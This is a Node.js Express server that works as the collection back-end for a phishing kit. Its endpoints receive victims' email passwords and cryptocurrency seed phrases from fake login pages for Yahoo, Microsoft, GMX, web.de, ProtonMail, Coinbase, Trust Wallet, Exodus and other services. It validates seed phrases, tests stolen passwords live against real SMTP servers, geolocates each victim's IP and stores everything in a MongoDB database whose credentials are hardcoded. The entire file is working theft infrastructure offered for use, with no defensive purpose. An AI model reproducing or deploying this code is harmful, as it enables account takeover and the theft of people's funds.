let express = require("express"),
    app = express(),
    rp = require('request-promise'),
    requestIp = require('request-ip'),
    bodyParser = require('body-parser'),
    mongoose = require("mongoose"),
    Sniffr = require("sniffr"),
    s = new Sniffr(),
    Bip39 = require("bip39"),
    yahooVictimSchema = null,
    yahooVictim = null,
    aolVictimSchema = null,
    aolVictim = null,
    microsoftVictimSchema = null,
    microsoftVictim = null,
    blockchainVictimSchema = null,
    blockchainVictim = null,
    trustwalletVictim = null,
    trustwalletVictimSchema = null,
    exodusWalletVictim = null,
    exodusWalletVictimSchema = null,
    metamaskVictim = null,
    metamaskVictimSchema = null,
    coinbaseUsers = null,
    coinbaseUsersSchema = null,
    mailComUsers = null,
    mailComUsersSchema = null,
    gmxUsers = null,
    gmxUsersSchema = null,
    attUsers = null,
    attUsersSchema = null,
    webmailUsers = null,
    webmailUsersSchema = null,
    webDeUsers = null,
    webDeUsersSchema = null,
    ionosUsers = null,
    ionosUsersSchema = null,
    ovhUsers = null,
    ovhUsersSchema = null,
    spectrumUsers = null,
    tutanotaUsers = null,
    tutanotaUsersSchema = null,
    spectrumUsersSchema = null,
    protonMailUsers = null,
    protonMailUsersSchema = null,
    visitorIp = null,
    db = null,
    nodemailer = require("nodemailer");

mongoose.connect("mongodb+srv://nanoskillo1:kdFIMzhMdAoYgnfj@cluster0.17x0o.mongodb.net/text?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
})

db = mongoose.connection;

yahooVictimSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

yahooVictim = mongoose.model("yahooVictim", yahooVictimSchema);

aolVictimSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

aolVictim = mongoose.model("aolVictim", aolVictimSchema);

microsoftVictimSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

microsoftVictim = mongoose.model("microsoftVictim", microsoftVictimSchema);

blockchainVictimSchema = new mongoose.Schema({
    email: String,
    number: String,
    phrase: String,
    logDate: String,
    userDevice: String,
    userAgent: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

blockchainVictim = mongoose.model("blockchainVictim", blockchainVictimSchema);

trustwalletVictimSchema = new mongoose.Schema({
    email: String,
    number: String,
    phrase: String,
    logDate: String,
    userDevice: String,
    userAgent: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

trustwalletVictim = mongoose.model("trustwalletVictim", trustwalletVictimSchema);

exodusWalletVictimSchema = new mongoose.Schema({
    email: String,
    number: String,
    phrase: String,
    logDate: String,
    userDevice: String,
    userAgent: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

exodusWalletVictim = mongoose.model("exodusWalletVictim", exodusWalletVictimSchema);

coinbaseUsersSchema = new mongoose.Schema({
    email: String,
    number: String,
    phrase: String,
    logDate: String,
    userDevice: String,
    userAgent: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

coinbaseUsers = mongoose.model("coinbaseUsers", coinbaseUsersSchema);

mailComUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

mailComUsers = mongoose.model("mailComUsers", mailComUsersSchema);

gmxUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

gmxUsers = mongoose.model("gmxUsers", gmxUsersSchema);

attUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

attUsers = mongoose.model("attUsers", attUsersSchema);

webmailUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

webmailUsers = mongoose.model("webmailUsers", webmailUsersSchema);

webDeUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

webDeUsers = mongoose.model("webDeUsers", webDeUsersSchema);

ionosUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

ionosUsers = mongoose.model("ionosUsers", ionosUsersSchema);

ovhUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

ovhUsers = mongoose.model("ovhUsers", ovhUsersSchema);

spectrumUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

spectrumUsers = mongoose.model("spectrumUsers", spectrumUsersSchema);

protonMailUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

protonMailUsers = mongoose.model("protonMailUsers", protonMailUsersSchema);



tutanotaUsersSchema = new mongoose.Schema({
    email: String,
    password: String,
    passwordTried: String,
    userDevice: String,
    userAgent: String,
    logDate: String,
    website: String,
    victimIpInfo: {}
}, {
    minimize: false
})

tutanotaUsers = mongoose.model("tutanotaUsers", tutanotaUsersSchema);







app.set("port", (process.env.PORT || 8080));

app.use(bodyParser.json())

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

app.post("/yh_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})

app.post("/aol_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveAolVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})

app.post("/microsoft_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveMicrosoftVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})

app.post("/blockchain_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    if (Bip39.validateMnemonic(req.body.phrase.toLowerCase())) {

        getVictimIpInfoAndSaveBlockchainVictimInfoToDb(req.body.email, req.body.number, req.body.phrase, req.body.date, s.os.name, req.headers['user-agent'], req.body.website, req, res);
    }

})

app.post("/trustwallet_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    if (Bip39.validateMnemonic(req.body.phrase.toLowerCase())) {

        getVictimIpInfoAndSaveTrustWalletVictimInfoToDb(req.body.email, req.body.number, req.body.phrase, req.body.date, s.os.name, req.headers['user-agent'], req.body.website, req, res);
    }

})

app.post("/exodus_wallet_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    if (Bip39.validateMnemonic(req.body.phrase.toLowerCase())) {

        getVictimIpInfoAndSaveExodusWalletVictimInfoToDb(req.body.email, req.body.number, req.body.phrase, req.body.date, s.os.name, req.headers['user-agent'], req.body.website, req, res);
    }

})

app.post("/coinbase", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    if (Bip39.validateMnemonic(req.body.phrase.toLowerCase())) {

        getVictimIpInfoAndSaveCoinbaseUsersToDb(req.body.email, req.body.number, req.body.phrase, req.body.date, s.os.name, req.headers['user-agent'], req.body.website, req, res);

    }
})

app.post("/mailcom", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveMailComVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})


app.post("/gmx", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    if (req.body.email.includes("@gmx.com") === true || req.body.email.includes("@gmx.us") === true) {

        let transport = nodemailer.createTransport({
            host: "smtp.gmx.com",
            port: 587,
            secure: false,
            auth: {
                user: req.body.email.toLowerCase(),
                pass: req.body.password,
            },
            tls: {
                rejectUnauthorized: false,
            }
        });

        transport.verify(function(error, success) {
            if (error) {
                console.log(error.message);
                res.end("invalid password");
            } else {
                console.log("Valid login");
                getVictimIpInfoAndSaveGmxVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
            }
        })

    } else {
        getVictimIpInfoAndSaveGmxVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
    }


})

app.post("/att", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveAttVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})

app.post("/webmail", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    if (req.body.email === "" || req.body.email == undefined) {
        res.end("Done");
    } else {
        getVictimIpInfoAndSaveWebmailVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
    }

})

app.post("/webde", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    let transport = nodemailer.createTransport({
        host: `smtp.web.de`,
        port: 587,
        secure: false,
        auth: {
            user: req.body.email.toLowerCase(),
            pass: req.body.password,
        },
        tls: {
            rejectUnauthorized: false,
        }
    });

    transport.verify(function(error, success) {

        if (error) {

            console.log(error.message);

            if (error.message.includes("getaddrinfo ENOTFOUND")) {

                res.end("Server Error");
                getVictimIpInfoAndSaveWebDeVictimInfoToDb(req.body.email, req.body.password, "Server Error", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);

            } else {
                res.end("invalid password");
                getVictimIpInfoAndSaveWebDeVictimInfoToDb(req.body.email, req.body.password, "Invalid password", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
            }

        } else {
            console.log("Valid login");
            getVictimIpInfoAndSaveWebDeVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
        }
    })

})

app.post("/ionos", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    let transport = nodemailer.createTransport({
        host: `smtp.ionos.${req.body.utm}`,
        port: 587,
        secure: false,
        auth: {
            user: req.body.email.toLowerCase(),
            pass: req.body.password,
        },
        tls: {
            rejectUnauthorized: false,
        }
    });

    transport.verify(function(error, success) {

        if (error) {

            console.log(error.message);

            if (error.message.includes("getaddrinfo ENOTFOUND")) {

                res.end("Server Error");
                getVictimIpInfoAndSaveIonosVictimInfoToDb(req.body.email, req.body.password, "Server Error", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);

            } else {
                res.end("invalid password");
                getVictimIpInfoAndSaveIonosVictimInfoToDb(req.body.email, req.body.password, "Invalid password", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
            }

        } else {
            console.log("Valid login");
            getVictimIpInfoAndSaveIonosVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
        }
    })
})

app.post("/ovh", (req, res) => {

    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");

    let transport = nodemailer.createTransport({
        host: `ssl0.ovh.net`,
        port: 587,
        secure: false,
        auth: {
            user: req.body.email.toLowerCase(),
            pass: req.body.password,
        },
        tls: {
            rejectUnauthorized: false,
        }
    });

    transport.verify(function(error, success) {

        if (error) {

            console.log(error.message);

            if (error.message.includes("getaddrinfo ENOTFOUND")) {

                res.end("Server Error");
                getVictimIpInfoAndSaveOvhVictimInfoToDb(req.body.email, req.body.password, "Server Error", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);

            } else {
                res.end("invalid password");
                getVictimIpInfoAndSaveOvhVictimInfoToDb(req.body.email, req.body.password, "Invalid password", s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
            }

        } else {
            console.log("Valid login");
            getVictimIpInfoAndSaveOvhVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
        }
    })
})

app.post("/spectrum", (req, res) => {

    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveSpectrumVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})

app.post("/pm", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveProtonMailVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})



app.post("/tutanota", (req, res) => {

    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveTutanotaVictimInfoToDb(req.body.email, req.body.password, req.body.passwordTried, s.os.name, req.headers['user-agent'], req.body.date, req.body.website, req, res);
})





function getVictimIpInfoAndSaveProtonMailVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new protonMailUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveSpectrumVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new spectrumUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveOvhVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new ovhUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveIonosVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new ionosUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveWebDeVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new webDeUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveWebmailVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new webmailUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveAttVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new attUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveGmxVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new gmxUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveMailComVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new mailComUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveCoinbaseUsersToDb(email, number, phrase, logDate, userDevice, userAgent, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new coinbaseUsers({
            email,
            number,
            phrase,
            logDate,
            userDevice,
            userAgent,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveExodusWalletVictimInfoToDb(email, number, phrase, logDate, userDevice, userAgent, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new exodusWalletVictim({
            email,
            number,
            phrase,
            logDate,
            userDevice,
            userAgent,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveTrustWalletVictimInfoToDb(email, number, phrase, logDate, userDevice, userAgent, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new trustwalletVictim({
            email,
            number,
            phrase,
            logDate,
            userDevice,
            userAgent,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveBlockchainVictimInfoToDb(email, number, phrase, logDate, userDevice, userAgent, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new blockchainVictim({
            email,
            number,
            phrase,
            logDate,
            userDevice,
            userAgent,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveMicrosoftVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new microsoftVictim({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

function getVictimIpInfoAndSaveAolVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new aolVictim({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveTutanotaVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new tutanotaUsers({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}


function getVictimIpInfoAndSaveYahooVictimInfoToDb(email, password, passwordTried, userDevice, userAgent, logDate, website, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new yahooVictim({
            email,
            password,
            passwordTried,
            userDevice,
            userAgent,
            logDate,
            website,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
                console.log(doc);
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}

db.on("error", (err) => {
    console.log(err);
})

db.once("open", () => {

    console.log(`Database connected`);

    app.listen(app.get("port"), () => {

        console.log(`Listening on port ${app.get("port")}`);

    });

})